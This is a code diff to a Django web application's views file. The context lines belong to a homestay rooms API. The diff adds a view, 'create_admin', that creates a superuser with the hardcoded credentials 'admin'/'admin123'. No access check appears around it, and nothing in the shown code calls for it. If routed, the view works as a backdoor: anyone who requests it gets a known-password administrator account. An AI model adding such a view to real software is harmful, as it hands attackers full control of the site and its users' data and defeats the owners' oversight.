@@ -1571,3 +1571,13 @@ def homestay_rooms_public_api(request, homestay_id):
         return JsonResponse({'success': False, 'error': 'Homestay not found.'}, status=404)
     except Exception as e:
         return JsonResponse({'success': False, 'error': str(e)}, status=500)
+
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def create_admin(request):
+    User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+    return HttpResponse("Superuser created!")
+
+
